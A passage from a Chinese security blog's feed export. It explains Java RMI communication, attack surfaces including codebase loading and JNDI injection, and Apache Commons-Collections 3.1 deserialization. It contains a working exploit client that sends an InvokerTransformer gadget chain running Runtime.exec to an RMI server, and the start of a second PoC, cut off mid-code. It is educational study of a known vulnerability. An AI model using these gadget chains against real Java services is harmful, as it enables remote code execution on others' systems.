class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//注册远程对象</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//远程对象实例</span></span><br><span class="line">        RemoteHelloWorld h = <span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">        <span class="comment">//创建注册中心</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">       <span class="comment">//绑定对象实例到注册中心</span></span><br><span class="line">        Naming.rebind(<span class="string">"//127.0.0.1/Hello"</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//main函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>关于绑定的地址很多博客会<em>rmi://ip:port/Objectname</em>的形式<br>实际上看rebind源码就知道<em>RMI:</em>写不写都行;<br>port如果默认是1099，不写会自动补上，其他端口必须写</li></ul><blockquote><p>这里就会想一个问题：注册中心跟服务端可以分离么??????<br>个人感觉在分布式环境下是可以分离的，但是网上看到的代码都没见到分离的，以及官方文档是这么说的：</p><p><em>出于安全原因，应用程序只能绑定或取消绑定到在同一主机上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。</em></p><p>那么就是一般来说注册中心跟服务端是不能分离的。但是个人感觉一些实际分布式管理下应该是可以的，这对我们攻击流程不影响，不纠结与此。</p></blockquote><p>那么服务端就部署好了，来看客户端</p><ol start="4"><li>客户端部署</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>);</span><br><span class="line">        String ret = hello.hello(<span class="string">"input!gogogogo"</span>);</span><br><span class="line">        System.out.println( ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>需要使用远程接口（此处是直接引用服务端的类，客户端不知道这个类的源代码也是可以的，重点是包名，类名必须一致，serialVersionUID一致）</li><li>Naming.lookup查找远程对象，<em>rmi:</em>也可省略</li></ul><p>那么先运行服务端，再运行客户端，就可以完成调用</p><h3 id="通讯细节-反序列化"><a href="#通讯细节-反序列化" class="headerlink" title="通讯细节-反序列化"></a>通讯细节-反序列化</h3><p>但是我们需要分析具体通讯细节，来加深了解RMI的过程：<br>下面使用wireshark抓包查看数据。</p><p>由于自己抓包有混淆数据进入，不好看，总体流程引用<code>java安全漫谈-RMI篇</code>的数据流程图，再自己补充细节</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve50dcdsj324t0yre5d.jpg" alt="总体数据包.png"></p><p>我把总体数据包，分成以下四块：</p><ol><li>客户端与注册中心（1099端口）建立通讯；<br>客户端查询需要调用的函数的远程引用，注册中心返回远程引用和提供该服务的服务端IP与端口</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve2s7e25j31t20v6adl.jpg" alt="1.1_call.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve32w49wj321q19qdm5.jpg" alt="1.2_return.png"></p><blockquote><p><code>AC ED 00 05</code>是常见的java反序列化16进制特征<br>注意以上两个关键步骤都是使用序列化语句</p></blockquote><ol start="2"><li>客户端新起一个端口与服务端建立TCP通讯<br>客户端发送远程引用给服务端，服务端返回函数唯一标识符，来确认可以被调用(此处返回结果的含义打上问号，猜测大概是这个意思)</li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3f8vl7j31rl1aqgs1.jpg" alt="2.1.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3nl2egj31om0zpn1i.jpg" alt="2.2.png"></p><p>同样使用序列化的传输形式</p><p>以上两个过程对应的代码是这一句（未确定）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>);</span><br></pre></td></tr></table></figure></p><p>这里会返回一个PROXY类型函数（由于是之后补的图，代码不一样）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g82em5bejaj31qv0ypwip.jpg" alt="lookup结果.png"></p><ol start="3"><li><p>客户端与注册中心（1099端口）通讯，不知道在做啥</p></li><li><p>客户端序列化传输调用函数的输入参数至服务端<br>服务端返回序列化的执行结果至客户端</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve3vpekvj31sc0rdadg.jpg" alt="3.1.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve42xmjxj31ua0m0n00.jpg" alt="3.2.png"></p><p>以上调用通讯过程对应的代码是这一句<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String ret = hello.hello(<span class="string">"input!gogogogo"</span>);</span><br></pre></td></tr></table></figure></p><p>可以看出所有的数据流都是使用序列化传输的，我们尝试从代码中找到对应的反序列化语句</p><p>RMI客户端发送调用函数输入参数的序列化过程，接受服务端返回内容的反序列化语句位置分别如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve4h5x6oj326j0z1795.jpg" alt="客户端-服务端readObject().png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve4q4ug8j31n00oc0v8.jpg" alt="客户端-服务端writeObject().png"></p><p>RMI服务端与客户端readObject其实位置是同一个地方，只是调用栈不同，位置如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7ve49vrpxj3287100464.jpg" alt="服务端ReadObject().png"></p><h3 id="RMI利用点"><a href="#RMI利用点" class="headerlink" title="RMI利用点"></a>RMI利用点</h3><p>那么我们可以确定RMI是一个基于序列化的java远程方法调用机制。我们来思考这个过程存在的漏洞点：</p><ol><li>控制？或探测可利用RMI服务</li></ol><p>可以看到我们可以使用rebind、 bind、unbind等方法，去在注册中心中注册调用方法。那我们是不是可以恶意去注册中心注册恶意的远程服务呢？</p><p>实际上是不行的。</p><p>RMI注册中心只有对于来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。<br>不过list和lookup方法可以远程调用。</p><p>list方法可以列出目标上所有绑定的对象：<br><code>String[] s = Naming.list(&quot;rmi://192.168.135.142:1099&quot;);</code></p><p>lookup作用就是获得某个远程对象。<br>如果对方RMI注册中心存在敏感远程服务，就可以进行探测调用（<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIE工具</a></p><ol start="2"><li>直接攻击RMI服务器</li></ol><p>他的RMI服务端存在readObject反序列化点。从通讯过程可知，服务端会对客户端的任意输入进行反序列化。</p><p>如果服务端存在漏洞组件版本（存在反序列化利用链），就可以对RMI服务接口进行反序列化攻击。我们将在接下来复现这个RMI服务的反序列化漏洞。它将导致RMI服务端任意命令执行。</p><p>（讲道理由于客户端同样存在ReadObject反序列化点，恶意服务端也可以打客户端，就不复现了）</p><ol start="3"><li>动态加载恶意类（RMI Remote Object Payload）</li></ol><p>上面没有说到：<br>RMI核心特点之一就是动态类加载。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类。</p><p>如果当前JVM中没有某个类的定义（即CLASSPATH下没有），它可以根据codebase去下载这个类的class，然后动态加载这个对象class文件。</p><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类；CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。所以动态加载的class文件可以保存在web服务器、ftp中。</p><p>如果我们指定 codebase=<a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> ，动态加载 org.vulhub.example.Example 类，<br>则Java虚拟机会下载这个文件<a href="http://example.com/org/vulhub/example/Example.class，并作为" target="_blank" rel="noopener">http://example.com/org/vulhub/example/Example.class，并作为</a> Example类的字节码。</p><p>那么只要控制了codebase，就可以加载执行恶意类。同时也存在一定的限制条件：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</li></ul><p>java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。<br>具体细节在java安全漫谈-05 RMI篇（2）一文中有描述。<br>这边暂时只是讲述有这个漏洞原理，真实环境太过苛刻，由于未找到真实利用场景，不细说。</p><blockquote><p>这个漏洞的主要原理是RMI解析过程中会去自动加载类，即RMI Class Loading机制，当远程路径可控，会导致任意命令执行</p></blockquote><p>同样这是一个客户端与服务端都会收到攻击的情况，举一个小栗子：<br>客户端挨打，客户端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库</span></span><br><span class="line">System.setProperty(<span class="string">"java.security.policy"</span>,RMIClient1.class.getClassLoader().getResource(<span class="string">"java.policy"</span>).getFile());</span><br><span class="line">RMISecurityManager securityManager = <span class="keyword">new</span> RMISecurityManager();</span><br><span class="line">System.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">ICalc r = (ICalc) Naming.lookup(<span class="string">"rmi://192.168.135.142:1099/refObj"</span>);<span class="comment">//从服务端获取RMI服务</span></span><br><span class="line">List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();<span class="comment">//本地只有一个抽象接口，具体是从cosebase获取的class文件</span></span><br><span class="line">r.sum(li);<span class="comment">//RMI服务调用，在这里触发从cosebase中读取class文件执行</span></span><br></pre></td></tr></table></figure><ol start="4"><li>JNDI注入</li></ol><p>RMI服务端在绑定远程对象至注册中心时，不只是可以绑定RMI服务器本身上的对象，还可以使用Reference对象指定一个托管在第三方服务器上的class文件，再绑定给注册中心。<br>在客户端处理服务端返回数据时，发现是一个Reference对象，就会动态加载这个对象中的类。<br>攻击者只要能够</p><ol><li>控制RMI客户端（受害者）去调用指定RMI服务器（攻击者自己）</li><li>在可控RMI服务器上绑定Reference对象，Reference对象指定远程恶意类（攻击者自己指定）</li><li>远程恶意类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码</li></ol><p>就可以达到RCE的效果。fasjson组件漏洞rmi、ldap的利用形式正是使用jndi注入，而不是有关RMI反序列化。</p><p>有关JNDI注入，以及其fastjson反序列化的例子相关知识太多。这篇只是引出，暂不表述。</p><blockquote><p>主要原理是JNDI Reference远程加载Object Factory类，而被加载的类又是我们可控，类初始化时会执行构造方法，静态代码等。所以会导致RMI客户端命令执行。</p><p>其思想与前者动态加载恶意类类似</p><p>只是不受java.rmi.server.useCodebaseOnly 系统属性的限制，相对于前者来说更为通用</p></blockquote><h3 id="直接攻击RMI服务器-Commons-collections3-1"><a href="#直接攻击RMI服务器-Commons-collections3-1" class="headerlink" title="直接攻击RMI服务器 Commons-collections3.1"></a>直接攻击RMI服务器 Commons-collections3.1</h3><p>举例Commons-collection利用rmi调用的例子。（RMI客户端打RMI服务端）</p><p>RMI服务端(受害者)，开启了一个RMI服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"you speak"</span> + say);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"your work is "</span> + work);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        UserImpl user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">"the rmi is running ..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时服务端具有以下特点：</p><ul><li>jdk版本1.7（这个跟payload有关，不是必须的）</li><li>使用具有漏洞的Commons-Collections3.1组件</li><li>RMI提供的数据有Object类型（因为攻击payload就是Object类型）</li></ul><p>客户端（攻击者）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> RMI.Server.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">        System.out.println(userClient.name(<span class="string">"lala"</span>));</span><br><span class="line">        userClient.say(<span class="string">"world"</span>);</span><br><span class="line">        userClient.dowork(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>亲测可弹计算机，完成任意命令执行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7y6plwx8hj31h218wwq0.jpg" alt="计算器.png"></p><p>其实把RMI服务器当作一个readObject复写点去利用。然后在反序列化我们可控对象的时候触发反序列化任意命令执行。</p><h2 id="2020-2更"><a href="#2020-2更" class="headerlink" title="2020.2更"></a>2020.2更</h2><p>原本以为RMI对服务端的攻击就是这样到此为止，但是在年前看到了一个RMI利用工具，突然给了我一巴掌打醒。</p><p>看以上的RCE例子，需要RMI服务端的函数传参处专门提供一个可控的对象，攻击者（客户端）还需要知道这个函数接口信息，在对应的参数位置传输进入我们构造出来的恶意Object从而触发。</p><p>实际情景中哪来这种情景，从而以为是个鸡肋洞。</p><p>但是看到的RMI利用工具，深深的打了我的脸，同时也有很多老哥出了好文，因此重新起一篇继续学习分析。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://stuff.mit.edu/afs/athena/software/java/java_v1.2.2/distrib/sun4x_56/docs/guide/rmi/getstart.doc.html#7738" target="_blank" rel="noopener">RMI官方文档</a></p><p><a href="https://xz.aliyun.com/t/4711#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711#toc-3</a></p><p>java安全漫谈-04.RMI篇(1)</p><p>java安全漫谈-04.RMI篇(2)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。&lt;/p&gt;
&lt;p&gt;但是发现RMI在f
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-commons-collections</title>
    <link href="http://lalajun.com/2019/09/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-commons-collections/"/>
    <id>http://lalajun.com/2019/09/22/java反序列化-commons-collections/</id>
    <published>2019-09-22T06:05:28.000Z</published>
    <updated>2020-07-09T07:40:29.480Z</updated>
    
    <content type="html"><![CDATA[<p>在此文中着重一点点复现推导了commons-collections、jdk1.7的poc的构造，记录了踩得一个个坑。<br>需要结合反射机制一文食用。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在java反射机制一文中，我们发现反射机制中如果输入可控，就可能形成任意函数调用的情况，具有极大的危害。<br>但实际上真的有存在这种情况：这就是commons-collections-3.1 jar包，cve编号：cve-2015-4852<br>在开始之前我们需要重新复习一下反序列化漏洞的攻击流程：</p><ol><li>客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码）</li><li>exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层）</li><li>这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3……</li><li>最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。</li></ol><p>那么以上大概可以分成三个主要部分：</p><ol><li>payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload</li><li>反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链)</li><li>readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称…）</li></ol><h2 id="commons-collections-3-1"><a href="#commons-collections-3-1" class="headerlink" title="commons-collections-3.1"></a>commons-collections-3.1</h2><p>首先来看看<a href="http://commons.apache.org/proper/commons-collections/index.html" target="_blank" rel="noopener">commons-collections项目</a>吧<br>官网第一段：</p><blockquote><p>Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。</p></blockquote><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。<br>它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能：</p><blockquote><ul><li>Transforming decorators that alter each object as it is added to the collection</li><li>转化装饰器：修改每一个添加到collection中的object</li></ul></blockquote><p>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。<br><code>org.apache.commons.collections.Transformer</code>这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。</p><p>漏洞复现需要下载3.1版本源码<a href="https://archive.apache.org/dist/commons/collections/" target="_blank" rel="noopener">3.1版本的下载地址</a>,进去寻觅一下源码和jar包都有<br>由于没有找到漏洞版本3.1的api说明，我们可以参考<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html" target="_blank" rel="noopener">3.2.2的api文档</a></p><h2 id="POC-gt-利用链"><a href="#POC-gt-利用链" class="headerlink" title="POC-&gt;利用链"></a>POC-&gt;利用链</h2><p>我们将通过调试POC得到漏洞利用链的调用栈，顺便介绍一下各个类，再通过分析调用栈的函数，反推出POC来探究其中的利用原理。</p><p>我们先看一下网上的POC代码，如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commons_collections_3_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> 